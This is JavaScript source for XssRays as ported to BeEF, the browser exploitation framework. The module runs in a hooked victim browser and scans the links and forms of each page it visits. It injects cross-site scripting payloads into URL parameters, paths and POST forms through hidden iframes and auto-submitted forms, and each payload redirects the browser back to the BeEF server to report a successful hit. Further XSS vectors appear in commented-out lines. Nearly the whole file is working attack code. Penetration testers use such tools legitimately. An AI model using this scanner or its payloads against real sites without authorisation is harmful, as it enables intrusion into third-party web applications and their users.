/*
 * XSS Rays
 * Legal bit:
 * Do not remove this notice.
 * Copyright (c) 2009 by Gareth Heyes
 * Programmed for Microsoft
 * gareth --at-- businessinfo -dot- co |dot| uk
 * Version 0.5.5
 *
 * This license governs use of the accompanying software. If you use the software, you
 * accept this license. If you do not accept the license, do not use the software.
 * 1. Definitions
 * The terms "reproduce," "reproduction," "derivative works," and "distribution" have the
 * same meaning here as under U.S. copyright law.
 * A "contribution" is the original software, or any additions or changes to the software.
 * A "contributor" is any person that distributes its contribution under this license.
 * "Licensed patents" are a contributor's patent claims that read directly on its contribution.
 * 2. Grant of Rights
 * (A) Copyright Grant- Subject to the terms of this license, including the license conditions and limitations in section 3, each contributor grants you a non-exclusive, worldwide, royalty-free copyright license to reproduce its contribution, prepare derivative works of its contribution, and distribute its contribution or any derivative works that you create.
 * (B) Patent Grant- Subject to the terms of this license, including the license conditions and limitations in section 3, each contributor grants you a non-exclusive, worldwide, royalty-free license under its licensed patents to make, have made, use, sell, offer for sale, import, and/or otherwise dispose of its contribution in the software or derivative works of the contribution in the software.
 * 3. Conditions and Limitations
 * (A) No Trademark License- This license does not grant you rights to use any contributors' name, logo, or trademarks.
 * (B) If you bring a patent claim against any contributor over patents that you claim are infringed by the software, your patent license from such contributor to the software ends automatically.
 * (C) If you distribute any portion of the software, you must retain all copyright, patent, trademark, and attribution notices that are present in the software.
 * (D) If you distribute any portion of the software in source code form, you may do so only under this license by including a complete copy of this license with your distribution. If you distribute any portion of the software in compiled or object code form, you may only do so under a license that complies with this license.
 * (E) The software is licensed "as-is." You bear the risk of using it. The contributors give no express warranties, guarantees or conditions. You may have additional consumer rights under your local laws which this license cannot change. To the extent permitted under your local laws, the contributors exclude the implied warranties of merchantability, fitness for a particular purpose and non-infringement.
 */

/*
 * XssRays 0.5.5 ported to BeEF by Michele "antisnatchor" Orru'
 * The XSS detection mechanisms has been rewritten from scratch: instead of using the location hash trick (that doesn't work anymore),
 * if the vulnerability is triggered the JS code vector will contact back BeEF.
 * Other aspects of the original code have been simplified and improved.
 */
beef.net.xssrays = {

    debug:true,
    sameOrigin: false,
    excludeURLS: /^https?:[\/]{2}somesite\.com/,
    errorTimeout:500,
    cleanUpTimeout:5000,
    completed:0,
    totalConnections:0,

    // BeEF variables
    xssraysScanId : 0,
    hookedBrowserSession: "",
    beefUrl: "",
    //TODO: we are overwriting this via startScan. it always check cross-domain resources. Add code to skip those in case it's = false
    crossDomain: false,

    vectors: [

//				  {input:"',XSS,'", name: 'Standard DOM based injection single', browser: 'ALL',url:true,form:true,path:true},
//				  {input:'",XSS,"', name: 'Standard DOM based injection double', browser: 'ALL',url:true,form:true,path:true},
//        {input: '\'><script>XSS<\/script>', name: 'Standard script injection single', browser: 'ALL',url:true,form:true,path:true},
        {input: '"><script>XSS<\/script>', name: 'Standard script injection double', browser: 'ALL',url:true,form:true,path:true} //,
//				  {input:"' style=abc:expression(XSS) ' \" style=abc:expression(XSS) \"", name: 'Expression CSS based injection', browser: 'IE',url:true,form:true,path:true},
//				  {input:'" type=image src=null onerror=XSS " \' type=image src=null onerror=XSS \'', name: 'Image input overwrite based injection', browser: 'ALL',url:true,form:true,path:true},
//				  {input:"' onload='XSS' \" onload=\"XSS\"/onload=\"XSS\"/onload='XSS'/", name: 'onload event injection', browser: 'ALL',url:true,form:true,path:true},
//        {input:'\'\"<\/script><\/xml><\/title><\/textarea><\/noscript><\/style><\/listing><\/xmp><\/pre><img src=null onerror=XSS>', name: 'Image injection HTML breaker', browser: 'ALL',url:true,form:true,path:true}
//				  {input:"'},XSS,function x(){//", name: 'DOM based function breaker single quote', browser: 'ALL',url:true,form:true,path:true},
//				  {input:'"},XSS,function x(){//', name: 'DOM based function breaker double quote', browser: 'ALL',url:true,form:true,path:true},
//				  {input:'\\x3c\\x73\\x63\\x72\\x69\\x70\\x74\\x3eXSS\\x3c\\x2f\\x73\\x63\\x72\\x69\\x70\\x74\\x3e', name: 'DOM based innerHTML injection', browser: 'ALL',url:true,form:true,path:true},
//  				  {input:'javascript:XSS', name: 'Javascript protocol injection', browser: 'ALL',url:true,form:true,path:true},
//  				  {input:'null,XSS//', name: 'Unfiltered DOM injection comma', browser: 'ALL',url:true,form:true,path:true},
        //{input:'null\nXSS//', name: 'Unfiltered DOM injection new line', browser: 'ALL',url:true,form:true,path:true}
    ],
    uniqueID: 0,
    rays: [],
    stack: [],

    // main function, where all starts :-)
    startScan:function(xssraysScanId, hookedBrowserSession, beefUrl, crossDomain, timeout) {

        this.xssraysScanId = xssraysScanId;
        this.hookedBrowserSession = hookedBrowserSession;
        this.beefUrl = beefUrl;
        this.crossDomain = crossDomain;
        this.cleanUpTimeout = timeout;

        this.scan();
        console.log("[XssRays] Starting scan");
        this.runJobs();
    },
    isIE:function() {
        return '\v' === 'v';
    },
    complete:function() {
        console.log("[XssRays] complete beef.net.xssrays.completed [" + beef.net.xssrays.completed
            + "] - beef.net.xssrays.totalConnections [" + beef.net.xssrays.totalConnections + "]");
        if (beef.net.xssrays.completed == beef.net.xssrays.totalConnections) {
            console.log("[XssRays] COMPLETE, notifying BeEF for scan id [" + beef.net.xssrays.xssraysScanId + "]");
            //TODO: understand why this is never called
            beef.net.send('/xssrays', beef.net.xssrays.xssraysScanId, "something");
        } else {
            this.getNextJob();
        }
    },
    getNextJob:function() {
        console.log("[XssRays] getNextJob");
        var that = this;
        if (this.stack.length > 0) {
            var func = that.stack.shift();
            if (func) {
                that.completed++;
                func.call(that);
            }
        }
    },
    scan:function() {
        this.scanLinks();
        this.scanForms();
    },
    scanPaths:function() {
        this.xss({type:'path'});
        return this;
    },
    scanForms: function() {
        this.xss({type:'form'});
        return this;
    },
    scanLinks: function() { //TODO: add depth crawling for links that are in the same domain
        console.log("[XssRays] scanLinks, document.links.length [" + document.links.length + "]");
        for (var i = 0; i < document.links.length; i++) {
            var url = document.links[i];
            if (this.excludeURLS.test(url)) {
                continue;
            }

            //TODO: check if the location has a port specified. if yes, add it (location.port) => example.com:8080
            if ((url.hostname.toString() === location.hostname.toString() || this.sameOrigin == false) && (location.protocol === 'http:' || location.protocol === 'https:')) {
                console.log("[XssRays] Starting scanning URL [" + url + "]\n url.href => " + url.href +
                    "\n url.pathname => " + url.pathname + "\n" +
                    "url.search => " + url.search + "\n");
                this.xss({href:url.href, pathname:url.pathname, hostname:url.hostname, port: url.port, protocol: location.protocol,
                    search:url.search, type: 'url'});//scan each link & param
            } else {
                if (this.debug) {
                    console.log('URLS\nurl :' + url.hostname.toString());
                    console.log('\nlocation :' + location.hostname.toString());
                }
            }
        }
        if (location.search.length > 0) {
            this.xss({pathname:location.pathname, hostname:url.hostname, port: url.port, protocol: location.protocol,search:location.search, type: 'url'});//scan originating url
        }
        return this;
    },
    xss:function(target) {
        switch (target.type) {
            case "url":
                if (target.search.length > 0) {
                    target.search = target.search.slice(1);
                    target.search = target.search.split(/&|&amp;/);
                    var params = {};
                    for (var i = 0; i < target.search.length; i++) {
                        target.search[i] = target.search[i].split('=');
                        params[target.search[i][0]] = target.search[i][1];
                    }
                    for (var i = 0; i < this.vectors.length; i++) {

                        //TODO: remove browser checks: add the BeEF ones
                        if (this.vectors[i].browser == 'IE' && !this.isIE()) {
                            continue;
                        }
                        if (this.vectors[i].browser == 'FF' && this.isIE()) {
                            continue;
                        }

                        if (!this.vectors[i].url) {
                            continue;
                        }

                        if (this.vectors[i].url) {
                            if(target.port == null || target.port == ""){
                                console.log("starting XSS on GET params of [" + target.href + "], passing url [" + target.protocol + '//' + target.hostname + target.pathname + "]");
                                this.temp_run(target.protocol + '//' + target.hostname + target.pathname, 'GET', this.vectors[i], params, true);//params
                            }else{
                                console.log("starting XSS on GET params of [" + target.href + "], passing url [" + target.protocol + '//' + target.hostname + ':' +target.port + target.pathname + "]");
                                this.temp_run(target.protocol + '//' + target.hostname + ':' + target.port + target.pathname, 'GET', this.vectors[i], params, true);//params
                            }
                        }
                        if (this.vectors[i].path) {
                            if(target.port == null || target.port == ""){
                                console.log("starting XSS on URI PATH of [" + target.href + "], passing url [" + target.protocol + '//' + target.hostname + target.pathname + "]");
                                this.temp_run(target.protocol + '//' + target.hostname + target.pathname, 'GET', this.vectors[i], null, true);//paths
                            }else{
                                console.log("starting XSS on URI PATH of [" + target.href + "], passing url [" + target.protocol + '//' + target.hostname + ':' +target.port + target.pathname + "]");
                                this.temp_run(target.protocol + '//' + target.hostname + ':' + target.port + target.pathname, 'GET', this.vectors[i], null, true);//paths
                            }
                        }
                    }
                }
                break;
            case "form":
                var params = {};
                var paramsstring = "";
                for (var i = 0; i < document.forms.length; i++) {
                    var action = document.forms[i].action || document.location;
                    var method = document.forms[i].method.toUpperCase() === 'POST' ?
                        'POST' :
                        'GET';

                    if (this.excludeURLS.test(action)) {
                        continue;
                    }
                    var excludeList = [];
                    for (var j = 0; j < document.forms[i].elements.length; j++) {
                        params[document.forms[i].elements[j].name] = document.forms[i].elements[j].value || 1;
                    }
                    for (var k = 0; k < this.vectors.length; k++) {

                        //TODO: remove browser checks: add the BeEF ones
                        if (this.vectors[k].browser == 'IE' && !this.isIE()) {
                            continue;
                        }
                        if (this.vectors[k].browser == 'FF' && this.isIE()) {
                            continue;
                        }
                        if (!this.vectors[k].form) {
                            continue;
                        }

                        if (this.vectors[k].form) {
                            if (method === 'GET') {
                                console.log("starting XSS on FORM action params, GET method of [" + action + "], params [" + paramsstring + "]");
                                this.temp_run(action, method, this.vectors[k], params, true, excludeList);//params
                            }
                            else {
                                console.log("starting XSS on FORM action params, POST method of [" + action + "], params [" + paramsstring + "]");
                                this.temp_run(action, method, this.vectors[k], params, false, excludeList);//params
                            }
                        }
                        if (this.vectors[k].path) {
                            console.log("starting XSS on FORM action URI PATH of [" + action + "], ");
                            this.temp_run(action, 'GET', this.vectors[k], null, true, excludeList);//paths
                        }
                    }
                }
                break;
        }
    },
    host: function(url) {
        var host = url;
        host = /^https?:[\/]{2}[^\/]+/.test(url.toString())
            ? url.toString().match(/^https?:[\/]{2}[^\/]+/)
            : /(?:^[^a-zA-Z0-9\/]|^[a-zA-Z0-9]+[:]+)/.test(url.toString())
            ? ''
            : location.hostname.toString();
        return host;
    },
    fileName: function(url) {
        return url.match(/(?:^[^\/]|^https?:[\/]{2}|^[\/]+)[^?]+/) || '';
    },

    urlEncode: function(str) {
        str = str.toString();
        str = str.replace(/"/g, '%22');
        str = str.replace(/&/g, '%26');
        str = str.replace(/\+/g, '%2b');
        return str;
    },

    // this is the main core function with the detection mechanisms...basically the "run" function that I didn't remove
    // is the original one, with the location.hash old trick that doesn't work anymore...
    temp_run: function(url, method, vector, params, urlencode, excludeList) {
        this.stack.push(function() {

            beef.net.xssrays.uniqueID++;
            console.log('[XssRays] Processing vector [' + vector.name + "], URL [" + url + "]");
            var poc = '';
            var pocurl = url;
            var exploit = '';
            var action = url;


            beef.net.xssrays.rays[beef.net.xssrays.uniqueID] = {vector:vector,url:url,params:params};
            var ray = this.rays[beef.net.xssrays.uniqueID];

            var paramsPos = 0;
            if (params != null) { // check for XSS in GET parameters
                for (var i in params) {
                    if (params.hasOwnProperty(i)) {

                        if (!/[?]/.test(url)) {
                            url += '?';
                            pocurl += '?';
                        }

                        poc = vector.input.replace(/XSS/g, "alert(1)");
                        pocurl += i + '=' + (urlencode ? encodeURIComponent(poc) : poc) + '&';

                        beef.net.xssrays.rays[beef.net.xssrays.uniqueID].vector.poc = pocurl;
                        beef.net.xssrays.rays[beef.net.xssrays.uniqueID].vector.method = method;

                        beefCallback = "document.location.href='" + this.beefUrl + "?hbsess=" + this.hookedBrowserSession + "&raysscanid=" + this.xssraysScanId
                            + "&poc=" + ray.vector.poc + "&name=" + ray.vector.name + "&method=" + ray.vector.method + "'";

                        exploit = vector.input.replace(/XSS/g, beefCallback);

                        url += i + '=' + (urlencode ? encodeURIComponent(exploit) : exploit) + '&';

                        paramsPos++;
                    }
                }
            } else {  // check for XSS in GET URL path
                var filename = beef.net.xssrays.fileName(url);

                poc = vector.input.replace(/XSS/g, "alert(1)");
                pocurl = poc.replace(filename, filename + '/' + (urlencode ? encodeURIComponent(exploit) : exploit) + '/');


                beef.net.xssrays.rays[beef.net.xssrays.uniqueID].vector.poc = pocurl;
                beef.net.xssrays.rays[beef.net.xssrays.uniqueID].vector.method = method;

                beefCallback = "document.location.href='" + this.beefUrl + "?hbsess=" + this.hookedBrowserSession + "&raysscanid=" + this.xssraysScanId
                    + "&poc=" + ray.vector.poc + "&name=" + ray.vector.name + "&method=" + ray.vector.method + "'";

                exploit = vector.input.replace(/XSS/g, beefCallback);

                //TODO: if the url is something like example.com/?param=1 then a secod slash will be added, like example.com//<xss>.
                //TODO: this need to checked and the slash shouldn't be added in this particular case
                url = url.replace(filename, filename + '/' + (urlencode ? encodeURIComponent(exploit) : exploit) + '/');
            }


            var iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.id = 'ray' + beef.net.xssrays.uniqueID;
            iframe.time = beef.net.xssrays.timestamp();
            iframe.name = 'ray' + Math.random().toString();

            if (method === 'GET') {
                iframe.src = url;
                document.body.appendChild(iframe);
                console.log("[xssrays] Creating XSS iFrame with src [" + iframe.src + "], id[" + iframe.id + "], time [" + iframe.time + "]");
            } else if (method === 'POST') {
                var form = '<form action="' + beef.net.xssrays.escape(action) + '" method="post" id="frm">';
                poc = '';
                pocurl = action + "?";
                paramsPos = 0;

                console.log("form action [" + action + "]");
                for (var i in params) {
                    if (params.hasOwnProperty(i)) {

                            //poc = vector.input.replace(/XSS/g, "BUG");
                            poc = "something";
                            pocurl += i + '=' + (urlencode ? encodeURIComponent(poc) : poc); // + '&';

                            beef.net.xssrays.rays[beef.net.xssrays.uniqueID].vector.poc = pocurl;
                            beef.net.xssrays.rays[beef.net.xssrays.uniqueID].vector.method = method;

                            beefCallback = "document.location.href='" + this.beefUrl + "?hbsess=" + this.hookedBrowserSession + "&raysscanid=" + this.xssraysScanId
                                + "&poc=" + ray.vector.poc + "&name=" + ray.vector.name + "&method=" + ray.vector.method + "'";

                            exploit = beef.net.xssrays.escape(vector.input.replace(/XSS/g, beefCallback));
                            form += '<textarea name="' + i + '">' + exploit + '<\/textarea>';
                            console.log("form param[" + i + "] = " + params[i].toString());


                            paramsPos++;
                    }
                }
                form += '<\/form>';
                document.body.appendChild(iframe);
                console.log("[xssrays] Creating form [" + form + "]");
                iframe.contentWindow.document.writeln(form);
                iframe.contentWindow.document.writeln('<script>document.createElement("form").submit.apply(document.forms[0]);<\/script>');
                console.log("[xssrays] submitting form");
            }

        });
    },

//    // old mechanisms...not called anymore in the code...see instead "temp_run"
//    run: function(url, method, vector, params, urlencode, excludeList) {
//        this.stack.push(function() {
//            if (excludeList) {
//                excludeList = new RegExp(excludeList.join('|'), 'i');
//            } else {
//                excludeList = new RegExp();
//            }
//            var self = this;
//            beef.net.xssrays.uniqueID++;
//            console.log('[XssRays] Processing vector [' + vector.name + "], URL [" + url + "]");
//            var poc = url;
//            var exploit = '';
//
//            var logger = 'location=window.name';
//
//            beef.net.xssrays.rays[beef.net.xssrays.uniqueID] = {vector:vector,url:url,params:params};
//            if (params == null) {
//                console.log("[XssRays] NULL params");
//                var filename = beef.net.xssrays.fileName(url);
//                exploit = vector.input.replace(/XSS/g, logger);
//                url = url.replace(filename, filename + '/' + (urlencode ? encodeURIComponent(exploit) : exploit) + '/');
//                exploit = vector.input.replace(/XSS/g, 'alert(1)');
//                poc = poc.replace(filename, filename + '/' + (urlencode ? encodeURIComponent(exploit) : exploit) + '/');
//            } else if (method === 'GET') {
//                console.log("[XssRays] params [" + params.toString() + "]");
//                url = beef.net.xssrays.fileName(url);
//                poc = url;
//                if (!/[?]/.test(url)) {
//                    url += '?';
//                    poc += '?'
//                }
//                var paramsPos = 0;
//                for (var i in params) {
//                    if (params.hasOwnProperty(i)) {
//                        if (excludeList.test(i)) {
//                            url += i + '=' + (urlencode ? encodeURIComponent(params[i]) : params[i]) + '&';
//                            poc += i + '=' + (urlencode ? encodeURIComponent(params[i]) : params[i]) + '&';
//                            continue;
//                        }
//
//                        if (paramsPos % 2 == 1 && vector.input2) {
//                            exploit = vector.input2.replace(/XSS/g, logger);
//                        } else {
//                            exploit = vector.input.replace(/XSS/g, logger);
//                        }
//                        url += i + '=' + (urlencode ? encodeURIComponent(exploit) : exploit) + '&';
//                        if (paramsPos % 2 == 1 && vector.input2) {
//                            exploit = vector.input2.replace(/XSS/g, 'alert(1)');
//                        } else {
//                            exploit = vector.input.replace(/XSS/g, 'alert(1)');
//                        }
//                        poc += i + '=' + (urlencode ? encodeURIComponent(exploit) : exploit) + '&';
//                        paramsPos++;
//                    }
//                }
//            }
//            var ieLoader = "document.getElementById('" + 'ray' + beef.net.xssrays.uniqueID + "').ieonload()";
//            if (beef.net.xssrays.isIE()) {
//                try {
//                    var iframe = document.createElement('<iframe name="' + location + '#xss' + '" onload="' + ieLoader + '">');
//                } catch (e) {
//                    var iframe = document.createElement('iframe');
//                }
//            } else {
//                var iframe = document.createElement('iframe');
//            }
//            iframe.style.display = 'none';
//            iframe.id = 'ray' + beef.net.xssrays.uniqueID;
//            iframe.time = beef.net.xssrays.timestamp();
//            iframe.name = location + '#xss';
//            iframe.ieonload = iframe.onload = function() {
//                //TODO: throws Permission denied errors,
//                console.log("[XssRays] iframe onload: id [" + iframe.id + "] - name [" + iframe.name + "]");
//                console.log("[XssRays] this.contentWindow.location => " + this.contentWindow.location);
//                try {
//                    if (this.contentWindow.location.hash.slice(1) == 'xss') {
//                        this.logger(this.id);
//                        if (document.getElementById(this.id)) {
//                            beef.net.xssrays.complete();
//                            document.body.removeChild(iframe);
//                            return;
//                        }
//                    }
//                } catch(e) {
//                    console.log("[XssRays] iframe onload: id [" + iframe.id + "] - EXCEPTION [" + e.toString() + "]");
//                }
//
//                var that = this;
//                setTimeout(function() {
//                    if (document.getElementById(that.id)) {
//                        document.body.removeChild(that);
//                        beef.net.xssrays.complete();
//                    }
//                }, this.errorTimeout)
//            }
//
//            if (method === 'GET') {
//                iframe.src = url;
//                document.body.appendChild(iframe);
//            } else if (method === 'POST') {
//                var form = '<form action="' + beef.net.xssrays.escape(url) + '" method="post" id="frm">';
//                poc += '?';
//                var paramsPos = 0;
//                for (var i in params) {
//                    if (params.hasOwnProperty(i)) {
//                        if (excludeList.test(i)) {
//                            form += '<textarea name="' + i + '">' + beef.net.xssrays.escape(params[i]) + '<\/textarea>';
//                            continue;
//                        } else {
//
//                            if (paramsPos % 2 == 1 && vector.input2) {
//                                exploit = beef.net.xssrays.escape(vector.input2.replace(/XSS/g, logger));
//                            }
//                            else {
//                                exploit = beef.net.xssrays.escape(vector.input.replace(/XSS/g, logger));
//                            }
//                            form += '<textarea name="' + i + '">' + exploit + '<\/textarea>';
//                            if (paramsPos % 2 == 1 && vector.input2) {
//                                exploit = vector.input2.replace(/XSS/g, 'alert(1)');
//                            }
//                            else {
//                                exploit = vector.input.replace(/XSS/g, 'alert(1)');
//                            }
//                            poc += i + '=' + (urlencode ? encodeURIComponent(exploit) : exploit) + '&';
//                            paramsPos++;
//                        }
//                    }
//                }
//                form += '<\/form>';
//                document.body.appendChild(iframe);
//                iframe.contentWindow.document.writeln(form);
//                iframe.contentWindow.document.writeln('<script>document.createElement("form").submit.apply(document.forms[0]);<\/script>');
//            }
//            beef.net.xssrays.rays[beef.net.xssrays.uniqueID].vector.poc = poc;
//            beef.net.xssrays.rays[beef.net.xssrays.uniqueID].vector.method = method;
//        });
//    },

    // run the jobs (temp_run functions added to the stack), and clean the shit (iframes) from the DOM after a timeout value
    runJobs: function() {
        var that = this;
        this.totalConnections = this.stack.length;
        that.getNextJob();
        setInterval(function() {
            var numOfConnections = 0;
            for (var i = 0; i < document.getElementsByTagName('iframe').length; i++) {
                var iframe = document.getElementsByTagName('iframe')[i];
                numOfConnections++;
                //console.log("runJobs parseInt(this.timestamp()) [" + parseInt(beef.net.xssrays.timestamp()) + "], parseInt(iframe.time) [" + parseInt(iframe.time) + "]");
                if (parseInt(beef.net.xssrays.timestamp()) - parseInt(iframe.time) > 5) {
                    if (iframe) {
                        beef.net.xssrays.complete();
                        console.log("runJobs cleaning up iframe [" + iframe.id + "]");
                        document.body.removeChild(iframe);

                    }
                }
            }

            if (numOfConnections == 0) {
                clearTimeout(this);
            }

        }, this.cleanUpTimeout);

        return this;
    },
    timestamp: function() {
        return parseInt(new Date().getTime().toString().substring(0, 10));
    },
    escape: function(str) {
        str = str.toString();
        str = str.replace(/</g, '&lt;');
        str = str.replace(/>/g, '&gt;');
        str = str.replace(/\u0022/g, '&quot;');
        str = str.replace(/\u0027/g, '&#39;');
        str = str.replace(/\\/g, '&#92;');
        return str;
    }

};

beef.regCmp('beef.net.xssrays');
